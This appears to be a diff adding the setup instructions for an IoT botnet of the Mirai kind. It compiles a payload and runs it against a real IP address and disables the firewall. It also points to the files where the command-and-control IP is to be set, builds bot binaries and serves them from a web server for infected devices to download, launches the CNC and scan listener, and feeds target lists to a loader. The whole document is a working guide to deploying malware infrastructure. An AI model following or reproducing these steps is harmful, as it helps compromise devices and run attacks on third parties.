@@ -1,0 +1,29 @@
+sudo apt install gcc golang electric-fence mysql-server mysql-client screen dialog python3 apache2 -y
+gcc payload.c -g -o payload -pthread
+./payload 178.32.96.252
+sudo bash ./tools/compilers.sh
+ufw disable
+ufw status
+Place to change IP:
+	 tools\misc\shell
+	 tools\misc\tftp
+	 tools\scanListen.go
+
+Place to change IP (replace . by ,):
+	 bot\main.c line 113
+	 retrieve\ret.c line 79
+	 retrieve\retrieve.c line 125
+
+For build bins:
+bash build.sh release
+cd release
+cp * /var/www/html
+
+For build CNC:
+apt-get install golang	 
+bash build.sh debug
+cd debug
+ulimit -n999999; ulimit -u9999999; screen ./cnc
+ulimit -n999999; ulimit -u9999999; screen ./scanlisten
+
+cat *.txt | ./loader
